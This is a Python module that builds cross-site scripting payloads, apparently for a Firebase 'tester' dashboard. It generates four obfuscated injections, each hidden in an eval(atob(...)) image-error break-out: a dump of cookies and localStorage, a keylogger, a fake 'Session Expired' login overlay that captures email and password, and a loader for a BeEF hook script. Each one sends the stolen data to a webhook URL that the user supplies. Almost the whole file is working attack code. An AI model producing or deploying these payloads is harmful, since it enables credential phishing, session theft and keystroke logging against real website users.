"""Reusable XSS payload generators (ported from the CLI Firebase tester).

The originals hard-coded webhook URLs and product-specific records. Here we
keep the JavaScript building blocks but parameterise the webhook + return only
the payload string, so the dashboard user supplies their own webhook(s) and
chooses what to do with the result.
"""
from __future__ import annotations

import base64
from typing import Iterable

_LEGIT_PREFIX = (
    "\u0d9a\u0dca\u200d\u0dbb\u0dd3\u0db8\u0dca"  # zero-width-joiner sequence
)


def _b64(js: str) -> str:
    return base64.b64encode(js.encode("utf-8")).decode("ascii")


def _wrap(js: str) -> str:
    """Wrap a JS snippet in a generic ``onerror`` image break-out."""
    return '"><img src=x onerror="eval(atob(\'' + _b64(js) + '\'))"><span title="'


def _fetch_webhooks(webhooks: Iterable[str], body_var: str = "d") -> str:
    parts: list[str] = []
    for wh in webhooks:
        wh = (wh or "").strip()
        if not wh:
            continue
        safe = wh.replace("'", "%27")
        parts.append(
            f"fetch('{safe}',{{method:'POST',mode:'no-cors',"
            f"headers:{{'Content-Type':'application/json'}},body:{body_var}}});"
        )
    return "".join(parts)


def localstorage_dump(webhooks: Iterable[str]) -> str:
    js = (
        "var d=JSON.stringify({content:'**LocalStorage Dump**\\nURL: '"
        "+location.href+'\\nCookie: '+document.cookie+'\\nLS: '"
        "+JSON.stringify(localStorage).slice(0,1800)});"
        + _fetch_webhooks(webhooks)
    )
    return _LEGIT_PREFIX + _wrap(js)


def keylogger(webhooks: Iterable[str]) -> str:
    js = (
        "document.addEventListener('keydown',function(e){"
        "var d=JSON.stringify({content:'**Key:** '+e.key+' | **Field:** '"
        "+(document.activeElement.name||document.activeElement.id||"
        "document.activeElement.placeholder||'unknown')+' | '+location.href});"
        + _fetch_webhooks(webhooks)
        + "})"
    )
    return _LEGIT_PREFIX + _wrap(js)


def fake_login_overlay(webhooks: Iterable[str]) -> str:
    forwards = _fetch_webhooks(webhooks)
    js = (
        "var o=document.createElement('div');"
        "o.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;"
        "background:rgba(0,0,0,0.85);z-index:99999;display:flex;"
        "align-items:center;justify-content:center';"
        "o.innerHTML='<div style=\"background:#fff;padding:40px;border-radius:12px;min-width:320px\">"
        "<h2 style=\"color:#FF3600;margin-bottom:20px\">Session Expired</h2>"
        "<p style=\"color:#666;font-size:14px;margin-bottom:20px\">Please sign in again.</p>"
        "<form onsubmit=\"var d=JSON.stringify({content:\\'**Creds**\\\\nEmail:\\'+this.email.value+\\'\\\\nPass:\\'+this.pass.value});"
        + forwards.replace("d", "d")  # placeholder; forwards uses body var "d"
        + "return false\">"
        "<input name=email placeholder=Email>"
        "<input name=pass type=password placeholder=Password>"
        "<button>Sign In</button></form></div>';"
        "document.body.appendChild(o)"
    )
    return _LEGIT_PREFIX + _wrap(js)


def beef_hook(hook_url: str) -> str:
    hook_url = (hook_url or "").strip().replace("'", "%27")
    js = (
        "var s=document.createElement('script');"
        f"s.src='{hook_url}';"
        "document.head.appendChild(s)"
    )
    return _LEGIT_PREFIX + _wrap(js)


PAYLOAD_KINDS = {
    "localstorage_dump": "LocalStorage dump",
    "keylogger": "Keylogger",
    "fake_login": "Fake login overlay",
    "beef_hook": "BeEF hook",
}
